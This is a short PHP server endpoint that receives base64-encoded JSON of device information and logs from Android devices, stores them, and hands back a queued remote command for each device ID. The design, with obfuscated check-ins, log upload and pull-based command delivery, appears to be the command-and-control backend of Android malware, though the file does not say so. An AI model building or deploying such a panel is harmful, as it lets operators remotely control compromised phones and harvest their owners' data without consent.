<?php
require_once __DIR__ . '/database.php';

header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST');
header('Access-Control-Allow-Headers: Content-Type');

if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    echo "NeedPost";
    exit;
} 

$input = file_get_contents('php://input');
if (empty($input)) {
    http_response_code(400);
    exit;
}

$decoded = base64_decode($input, true);
if ($decoded === false) {
    http_response_code(400);
    exit;
}

$jsonData = json_decode($decoded, true);
if (json_last_error() !== JSON_ERROR_NONE) {
    http_response_code(400);
    exit;
}

$deviceInfo = $jsonData['device-info'] ?? [];
$logsInfo = $jsonData['logs-info'] ?? [];

$cmd = processDeviceInfo($deviceInfo);
processLogsInfo($logsInfo);

$androidId = $deviceInfo['android_id'] ?? '';
$response = ['cmd' => ''];

if (!empty($cmd)) {
    $response['cmd'] = $cmd;
    clearDeviceCmd($androidId);
}

$jsonResponse = json_encode($response);
echo base64_encode($jsonResponse);
http_response_code(200);
?>

